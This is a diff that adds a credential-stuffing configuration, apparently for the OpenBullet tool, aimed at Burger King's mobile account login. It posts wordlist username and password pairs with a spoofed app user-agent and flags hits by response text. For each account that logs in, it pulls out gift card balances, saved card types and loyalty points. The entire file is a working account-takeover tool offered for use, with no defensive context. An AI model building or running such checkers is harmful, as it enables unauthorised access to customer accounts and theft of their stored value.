@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "BurgerKing",
+  "SuggestedBots": 1,
+  "LastModified": "2019-02-08T17:36:08.5140004+01:00",
+  "AdditionalInfo": "",
+  "Author": "Lucky",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://bkm-native-prod.tillster.com/mobile-aggregation-service/rest/account/login" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Burger%20King/2 CFNetwork/974.2.1 Darwin/18.0.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "tenant: bk-us-native" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "invalid username and/or password" 
+  KEYCHAIN Success OR 
+    KEY "userType" 
+PARSE "<SOURCE>" JSON "giftCardDetailedBalanceList" Recursive=FALSE -> CAP "GCBalance" "" "" 
+PARSE "<SOURCE>" LR "\"cardType\":\"" "\",\"maskedCardNumber\"" Recursive=FALSE -> CAP "Cards" "" "" 
+PARSE "<SOURCE>" JSON "loyaltyPoints" Recursive=FALSE -> CAP "loyaltyPoints" "" "" 
